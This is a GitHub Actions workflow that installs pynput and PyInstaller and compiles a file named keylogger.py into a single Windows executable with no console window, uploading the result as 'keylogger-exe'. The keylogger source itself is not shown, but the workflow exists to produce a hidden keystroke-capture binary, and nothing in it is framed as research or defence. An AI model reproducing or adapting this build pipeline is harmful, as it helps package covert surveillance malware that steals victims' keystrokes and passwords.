name: Build EXE

on: push

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.7'
          architecture: 'x86'
      - run: pip install pynput pyinstaller
      - run: pyinstaller --onefile --noconsole keylogger.py
      - uses: actions/upload-artifact@v4
        with:
          name: keylogger-exe
          path: dist/keylogger.exe
